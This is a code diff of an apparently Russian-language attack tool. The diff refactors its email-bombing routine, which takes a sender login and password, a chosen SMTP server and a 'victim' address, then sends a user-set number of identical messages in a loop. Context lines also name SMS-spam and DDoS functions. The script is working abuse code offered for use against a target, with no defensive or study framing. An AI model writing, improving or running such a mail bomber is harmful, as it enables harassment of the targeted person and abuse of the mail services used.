@@ -79,73 +79,140 @@ def sms():
       main()
 
 def mail():
+  global L
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('Введите адрес почты с которой будеть отправляться сообщения (только почта яндекс или мэйл):')
+  print ('Введите адрес почты с которой будеть отправляться сообщения:')
   print ('[*] ВНИМАНИЕ! К ПОЧТЕ ДОЛЖЕН БЫТЬ ПРИВЯЗАН НОМЕР ТЕЛЕФОНА!')
   L = input ('>>>')
+  if L == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail()
+  else:
+    mail1()
+def mail1():
+  global P
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
   print ('Введите пароль от почты:')
   P = input ('>>>')
+  if P == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail1()
+  else:
+    mail2()
+def mail2():
+  global U
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('СЕРВИС ВАШЕЙ ПОЧТЫ:')
+  print ('Сервис вашей почты:')
   print ('[1] - GMAIL.COM')
   print ('[2] - YANDEX.RU')
   print ('[3] - MAIL.RU')
   Uchoose = input ('>>>')
   if Uchoose == "1":
     U = "smtp.gmail.com"
+    mail3()
   if Uchoose == "2":
     U = "smtp.yandex.ru"
+    mail3()
   if Uchoose == "3":
     U = "smtp.mail.ru"
-  else:
-    mail()
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('ПОЧТА ЖЕРТВЫ')
-  To = input ('>>>')
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('ТЕМА ПИСЬМА')
-  T = input ('>>>')
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('ТЕКСТ ПИСЬМА')
-  M = input ('>>>')
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('КОЛИЧЕСТВО ПИСЕМ')
-  N = input ('>>>')
-  for value in range( int( N ) ):
-    msg = MIMEMultipart()
-    msg[ 'Subject' ] = T
-    msg[ 'From' ] = L
-    body = M
-    msg.attach( MIMEText( body, 'plain' ) )
-    server = root.SMTP_SSL( U, 465 )
-    server.login( L, P )
-    server.sendmail( L, To, msg.as_string() )
-    server.quit()
-    value += 1
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('[*] Спамер завершён')
-  print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
-  print ('[2] - ВЕРНУТСЯ В СПАМ СМС')
-  choose3 = input ('>>>')
-  if choose3 == '1':
-    main()
-  if choose3 == '2':
-    mail()
+    mail3()
   else:
     os.system('cls' if os.name=='nt' else 'clear')
     print (logo)
-    print ('[*] Вы автоматически перенаправлены в главное меню')
+    print ('[!] Ошибка! Повтори запрос!')
     time.sleep(2)
-    main()
+    mail2()
+def mail3():
+  global To
+  os.system('cls' if os.name=='nt' else 'clear')
+  print (logo)
+  print ('Почта жертвы')
+  To = input ('>>>')
+  if To == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail3()
+  else:
+    mail4()
+def mail4():
+  global T
+  os.system('cls' if os.name=='nt' else 'clear')
+  print (logo)
+  print ('Тема письма')
+  T = input ('>>>')
+  if T == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail4()
+  else:
+    mail5()
+def mail5():
+  global M
+  os.system('cls' if os.name=='nt' else 'clear')
+  print (logo)
+  print ('Текст письма')
+  M = input ('>>>')
+  if M == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail5()
+  else:
+    mail6()
+def mail6():
+  global N
+  os.system('cls' if os.name=='nt' else 'clear')
+  print (logo)
+  print ('Количество писем')
+  N = input ('>>>')
+  if N == "":
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[!] Ошибка! Повтори запрос!')
+    time.sleep(2)
+    mail6()
+  else:
+    for value in range( int( N ) ):
+      msg = MIMEMultipart()
+      msg[ 'Subject' ] = T
+      msg[ 'From' ] = L
+      body = M
+      msg.attach( MIMEText( body, 'plain' ) )
+      server = root.SMTP_SSL( U, 465 )
+      server.login( L, P )
+      server.sendmail( L, To, msg.as_string() )
+      server.quit()
+      value += 1
+    os.system('cls' if os.name=='nt' else 'clear')
+    print (logo)
+    print ('[*] Спамер завершён')
+    print ('[1] - ВЫХОД В ГЛАВНОЕ МЕНЮ')
+    print ('[2] - ВЕРНУТСЯ В СПАМ ПОЧТЫ')
+    choose3 = input ('>>>')
+    if choose3 == '1':
+      main()
+    if choose3 == '2':
+      mail()
+    else:
+      os.system('cls' if os.name=='nt' else 'clear')
+      print (logo)
+      print ('[*] Вы автоматически перенаправлены в главное меню')
+      time.sleep(2)
+      main()
 
 def ddos():
   global threads
@@ -188,7 +255,7 @@ def main():
       os.system('cls' if os.name=='nt' else 'clear')
       conection()
   print ("[*] ПРОИСХОДИТ ЗАПУСК ПРОГРАММЫ!")
-  time.sleep(30)
+  time.sleep(1)
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
   print ('[1] - ОТКРЫТЬ СПАМЕР')
